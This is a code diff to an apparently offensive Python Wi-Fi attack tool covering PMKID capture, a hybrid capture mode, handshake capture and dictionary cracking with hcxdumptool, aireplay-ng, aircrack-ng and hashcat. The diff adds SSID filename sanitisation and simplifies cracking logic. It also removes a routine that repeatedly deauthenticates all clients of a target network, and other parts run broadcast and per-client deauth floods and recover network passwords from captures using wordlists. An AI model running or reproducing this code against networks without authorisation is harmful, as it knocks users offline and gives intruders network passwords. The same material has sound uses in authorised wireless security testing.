@@ -19,6 +19,7 @@ from rich.prompt import Prompt
 from rich.table import Table
 
 from app.ui import BORDER_STYLE
+from app.safety import sanitize_filename
 from attacks.commands import (
     aircrack_check,
     aircrack_crack,
@@ -50,7 +51,8 @@ def run_pmkid_attack(app) -> None:
         app.console.print("[bold yellow]Creating handshake directory...[/]")
         handshake_dir.mkdir(exist_ok=True)
 
-    output_file = handshake_dir / f"pmkid_{network['ssid']}_{timestamp}"
+    safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")
+    output_file = handshake_dir / f"pmkid_{safe_ssid}_{timestamp}"
     output_pcapng = output_file.with_suffix(".pcapng")
     output_hash = output_file.with_suffix(".22000")
     pmkid_found = False
@@ -84,10 +86,6 @@ def run_pmkid_attack(app) -> None:
         return table
 
     try:
-        app.console.print("\n[bold yellow]Important Information:[/]")
-        app.console.print("[bold cyan]- PMKID capture will continue until you press Ctrl+C")
-        app.console.print("[bold cyan]- If a PMKID is found, it will be saved but the process will continue\n")
-
         with Live(refresh_per_second=4) as live:
             process = subprocess.Popen(
                 hcxdumptool_capture(app.interface_name, output_pcapng),
@@ -205,14 +203,15 @@ def run_hybrid_attack(app) -> None:
 
     network = app.networks[app.selected_network]
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")
 
     handshake_dir = HANDSHAKE_DIR
     handshake_dir.mkdir(exist_ok=True)
 
-    handshake_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}"
-    pmkid_file = f"pmkid_{network['ssid']}_{timestamp}"
-    pmkid_pcapng = Path(f"{pmkid_file}.pcapng")
-    pmkid_hash = Path(f"{pmkid_file}.22000")
+    handshake_file = handshake_dir / f"handshake_{safe_ssid}_{timestamp}"
+    pmkid_file = handshake_dir / f"pmkid_{safe_ssid}_{timestamp}"
+    pmkid_pcapng = pmkid_file.with_suffix(".pcapng")
+    pmkid_hash = pmkid_file.with_suffix(".22000")
 
     handshake_found = False
     pmkid_found = False
@@ -260,7 +259,7 @@ def run_hybrid_attack(app) -> None:
         return table
 
     def check_for_new_clients():
-        nonlocal last_client_check, known_clients
+        nonlocal last_client_check
         current_time = time.time()
         if current_time - last_client_check < client_check_interval:
             return
@@ -294,12 +293,12 @@ def run_hybrid_attack(app) -> None:
     def check_for_handshake():
         nonlocal handshake_found, pmkid_found, final_handshake
         if not handshake_found:
-            cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
+            cap_files = list(handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*.cap"))
             if cap_files:
                 result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
                 if has_aircrack_handshake(result.stdout):
                     handshake_found = True
-                    final_handshake = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
+                    final_handshake = handshake_dir / f"handshake_{safe_ssid}_{timestamp}.cap"
                     shutil.move(str(cap_files[0]), str(final_handshake))
                     app.logger.info(
                         f"Hybrid: {security_type} handshake saved to {final_handshake} "
@@ -315,11 +314,6 @@ def run_hybrid_attack(app) -> None:
                 )
 
     try:
-        app.console.print("\n[bold yellow]Important Information:[/]")
-        app.console.print("[bold cyan]- Hybrid attack will continue until you press Ctrl+C")
-        app.console.print("[bold cyan]- If a handshake or PMKID is found, it will be saved but the process will continue")
-        app.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")
-
         with Live(refresh_per_second=4) as live:
             dump_proc = subprocess.Popen(
                 airodump_capture(
@@ -364,7 +358,7 @@ def run_hybrid_attack(app) -> None:
                 pmkid_proc.kill()
 
         for ext in [".csv", ".netxml", "-01.cap"]:
-            for f in handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*{ext}"):
+            for f in handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*{ext}"):
                 try:
                     f.unlink()
                 except Exception:
@@ -404,228 +398,10 @@ def run_hybrid_attack(app) -> None:
 
 
 def run_capture_handshake(app) -> None:
-    """Capture WPA/WPA2/WPA3 handshake with continuous deauth loop."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
-        return
+    """Capture WPA/WPA2/WPA3 handshake with the advanced capture engine."""
+    from app.services.attacks.handshake_engine import run_handshake_capture_engine
 
-    network = app.networks[app.selected_network]
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-
-    handshake_dir = HANDSHAKE_DIR
-    handshake_dir.mkdir(exist_ok=True)
-
-    output_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}"
-    handshake_found = False
-    dump_proc = None
-    pmkid_proc = None
-    start_time = time.time()
-
-    known_clients = set(network["clients"])
-    last_client_check = time.time()
-    client_check_interval = 5
-    client_lock = threading.Lock()
-
-    is_wpa3 = bool("cipher" in network and "WPA3" in network["cipher"])
-    if is_wpa3:
-        app.console.print("[bold blue]WPA3 network detected. Using specialized capture method...[/]")
-        app.logger.info(f"WPA3 handshake capture started for {network['ssid']}")
-
-    app.console.print("\n[bold yellow]Important Information:[/]")
-    app.console.print("[bold cyan]- Handshake capture will continue until you press Ctrl+C")
-    app.console.print("[bold cyan]- If a handshake is found, it will be saved but the process will continue")
-    app.console.print("[bold cyan]- Any new clients connecting to the network will be automatically targeted")
-    app.console.print("[bold cyan]- All clients will be deauthenticated simultaneously\n")
-
-    def create_status_table():
-        current_time = time.time()
-        elapsed_time = int(current_time - start_time)
-        hours = elapsed_time // 3600
-        minutes = (elapsed_time % 3600) // 60
-        seconds = elapsed_time % 60
-        elapsed_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
-
-        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
-        table.add_column("BSSID", style="cyan")
-        table.add_column("Channel", style="green")
-        table.add_column("ESSID", style="yellow")
-        table.add_column("Clients", style="cyan")
-        table.add_column("Status", style="green")
-        table.add_column("Time Elapsed", style="yellow")
-        table.add_column("Security", style="magenta")
-        with client_lock:
-            status = "[success]Handshake found (continuing)." if handshake_found else "[info]Capturing..."
-            security = "[bold cyan]WPA3" if is_wpa3 else "[bold yellow]WPA/WPA2"
-            table.add_row(
-                app.selected_network,
-                str(network["channel"]),
-                network["ssid"],
-                str(len(known_clients)),
-                status,
-                elapsed_str,
-                security,
-            )
-        return table
-
-    def deauth_client(client_mac):
-        try:
-            subprocess.run(
-                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=client_mac),
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=30,
-            )
-            return True
-        except Exception as exc:
-            app.logger.error(f"Error deauthenticating client {client_mac}: {str(exc)}")
-            return False
-
-    def deauth_all_clients():
-        with client_lock:
-            clients_list = list(known_clients)
-
-        with ThreadPoolExecutor(max_workers=min(10, len(clients_list) + 1)) as executor:
-            client_futures = {executor.submit(deauth_client, client): client for client in clients_list}
-            broadcast_future = executor.submit(
-                subprocess.run,
-                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2),
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-            for future in concurrent.futures.as_completed(client_futures):
-                client = client_futures[future]
-                try:
-                    success = future.result()
-                    if not success:
-                        app.logger.warning(f"Failed to deauth client: {client}")
-                except Exception as exc:
-                    app.logger.error(f"Exception deauthing client {client}: {str(exc)}")
-            try:
-                broadcast_future.result()
-            except Exception as exc:
-                app.logger.error(f"Exception during broadcast deauth: {str(exc)}")
-
-    def check_for_new_clients():
-        nonlocal last_client_check
-        current_time = time.time()
-        if current_time - last_client_check < client_check_interval:
-            return
-        last_client_check = current_time
-        with app._networks_lock:
-            if app.selected_network in app.networks:
-                current_clients = set(app.networks[app.selected_network]["clients"])
-                with client_lock:
-                    new_clients = current_clients - known_clients
-                    if new_clients:
-                        app.console.print(f"[bold green]Detected {len(new_clients)} new clients! Targeting them...[/]")
-                        for new_client in new_clients:
-                            app.logger.info(f"New client detected: {new_client}")
-                        known_clients.update(new_clients)
-
-    def check_for_handshake():
-        nonlocal handshake_found
-        if handshake_found:
-            return True
-        cap_files = list(handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*.cap"))
-        if not cap_files:
-            return False
-
-        found = False
-        if is_wpa3:
-            try:
-                result = subprocess.run(["wpaclean", "check_temp.cap", str(cap_files[0])], capture_output=True, text=True)
-                found = "handshake" in result.stdout.lower() or os.path.getsize("check_temp.cap") > 24
-                if os.path.exists("check_temp.cap"):
-                    os.remove("check_temp.cap")
-            except Exception:
-                result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
-                found = has_aircrack_handshake(result.stdout)
-        else:
-            result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
-            found = has_aircrack_handshake(result.stdout)
-
-        if found and not handshake_found:
-            handshake_found = True
-            final_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
-            shutil.move(str(cap_files[0]), str(final_file))
-            security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
-            app.logger.info(
-                f"{security_type} handshake captured and saved to {final_file} "
-                "(continuing capture until Ctrl+C)",
-            )
-            return True
-        return found
-
-    try:
-        with Live(refresh_per_second=4) as live:
-            dump_proc = subprocess.Popen(
-                airodump_capture(
-                    app.interface_name,
-                    channel=network["channel"],
-                    bssid=app.selected_network,
-                    output_prefix=output_file,
-                    wpa3=is_wpa3,
-                ),
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-            while True:
-                live.update(create_status_table())
-                live.refresh()
-                check_for_new_clients()
-                deauth_all_clients()
-                check_for_handshake()
-                time.sleep(0.25)
-    except KeyboardInterrupt:
-        if handshake_found:
-            app.console.print("\n[bold green]Handshake capture process stopped by user. Handshake was already captured successfully![/]")
-        else:
-            app.console.print("\n[bold yellow]Handshake capture operation stopped by user. No handshake was captured.[/]")
-    except Exception as exc:
-        app.console.print(f"\n[bold red]Error: {str(exc)}[/]")
-        app.logger.error(f"Error in handshake capture: {str(exc)}")
-    finally:
-        if dump_proc:
-            try:
-                dump_proc.terminate()
-                dump_proc.wait(timeout=2)
-            except Exception:
-                try:
-                    dump_proc.kill()
-                    dump_proc.wait(timeout=1)
-                except Exception:
-                    pass
-        if pmkid_proc:
-            try:
-                pmkid_proc.terminate()
-                try:
-                    pmkid_proc.wait(timeout=2)
-                except subprocess.TimeoutExpired:
-                    pmkid_proc.kill()
-                    try:
-                        pmkid_proc.wait(timeout=2)
-                    except Exception:
-                        pass
-            except Exception:
-                try:
-                    subprocess.run(
-                        ["pkill", "-9", "-f", f"hcxdumptool.*{app.selected_network}"],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                    )
-                except Exception:
-                    pass
-
-        for ext in [".csv", ".netxml", "-01.cap"]:
-            for f in handshake_dir.glob(f"handshake_{network['ssid']}_{timestamp}*{ext}"):
-                try:
-                    f.unlink()
-                except Exception:
-                    pass
-
-        security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
-        app.logger.info(f"{security_type} handshake capture completed: {'Successful' if handshake_found else 'Failed'}")
-        app.current_menu = "attack"
+    run_handshake_capture_engine(app)
 
 
 def run_dictionary_attack(app) -> None:
@@ -742,7 +518,11 @@ def run_dictionary_attack(app) -> None:
     app.console.print(f"1. Use default wordlist ({DEFAULT_WORDLIST})")
     app.console.print(f"2. Use rockyou wordlist ({ROCKYOU_WORDLIST})")
     app.console.print("3. Specify custom wordlist path")
-    wordlist_choice = Prompt.ask("Choose wordlist option", choices=["1", "2", "3"])
+    app.console.print("0. Cancel")
+    wordlist_choice = Prompt.ask("Choose wordlist option (0 to cancel)", choices=["0", "1", "2", "3"])
+
+    if wordlist_choice == "0":
+        return
 
     if wordlist_choice == "1":
         wordlist = str(DEFAULT_WORDLIST)
@@ -763,7 +543,6 @@ def run_dictionary_attack(app) -> None:
     app.console.print(f"\n[bold green]Starting dictionary attack against: {selected_file.name}[/]")
     app.console.print(f"[bold blue]Using wordlist: {wordlist}[/]")
     app.console.print("[bold yellow]This process may take some time. Press Ctrl+C to stop.[/]")
-
     start_time = time.time()
     password_found = False
     last_progress = 0
@@ -802,17 +581,17 @@ def run_dictionary_attack(app) -> None:
     except Exception as exc:
         app.logger.error(f"Error extracting network info: {str(exc)}")
 
+    uses_hashcat = False
     if choice == "2":
+        uses_hashcat = True
         cmd = hashcat_crack(selected_file, wordlist, mode=16800, workload=3, force=True)
         app.console.print("[bold blue]Using hashcat for PMKID cracking (mode 16800)[/]")
-    elif is_wpa3:
-        cmd = hashcat_crack(selected_file, wordlist, mode=22000, workload=3, force=True)
-        app.console.print("[bold blue]Using hashcat for WPA3 handshake cracking[/]")
     else:
-        valid_essid = essid if essid and essid != "ESSID" and "Encryption" not in essid else None
-        cmd = aircrack_crack(selected_file, wordlist, valid_essid)
-        if valid_essid:
-            app.console.print(f"[bold blue]Using network ESSID: {essid}[/]")
+        # Avoid forcing ESSID: malformed/ambiguous ESSID parsing can block valid cracks.
+        # This mirrors the known working manual command:
+        # aircrack-ng <capture.cap> -w <wordlist>
+        cmd = aircrack_crack(selected_file, wordlist, None)
+        app.console.print("[bold blue]Using aircrack-ng for dictionary attack[/]")
 
     try:
         process = subprocess.Popen(
@@ -851,7 +630,7 @@ def run_dictionary_attack(app) -> None:
                             last_speed = speed_match.group(1)
 
                     found_in_line = False
-                    password_candidate = extract_wifi_password(line, include_hashcat=is_wpa3)
+                    password_candidate = extract_wifi_password(line, include_hashcat=uses_hashcat)
                     if password_candidate:
                         current_key = password_candidate
                         password_found = True
@@ -866,23 +645,26 @@ def run_dictionary_attack(app) -> None:
                         live.update(create_status_display())
                     if any(x in line.lower() for x in ["reading", "loaded"]) and last_progress < 0.1:
                         last_progress = 0.05
-                    if process.poll() is not None:
-                        last_progress = 100.0
-                        live.update(create_status_display())
-                        break
                 except Exception as exc:
                     app.logger.error(f"Error parsing aircrack output: {str(exc)}")
 
+        # Drain any remaining buffered output after the read loop ends.
+        if process and process.stdout:
+            remaining_output = process.stdout.read()
+            if remaining_output:
+                all_output.append(remaining_output)
+        last_progress = 100.0
+
         if not password_found:
             full_output = "\n".join(all_output)
-            password_candidate = extract_wifi_password(full_output, include_hashcat=is_wpa3)
+            password_candidate = extract_wifi_password(full_output, include_hashcat=uses_hashcat)
             if password_candidate:
                 current_key = password_candidate
                 password_found = True
                 app.logger.info(f"Password found in output analysis: {current_key}")
 
         if password_found and not is_valid_wifi_password(current_key):
-            app.logger.warning(f"Invalid password detected: {current_key} - marking as not found")
+            app.logger.warning(f"Invalid password candidate detected: {current_key} - marking as not found")
             password_found = False
             current_key = ""
 
@@ -948,10 +730,9 @@ def run_dictionary_attack(app) -> None:
             except Exception:
                 pass
         try:
-            if is_wpa3:
+            if uses_hashcat:
                 subprocess.run(["pkill", "-9", "-f", "hashcat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             else:
                 subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
             pass
-
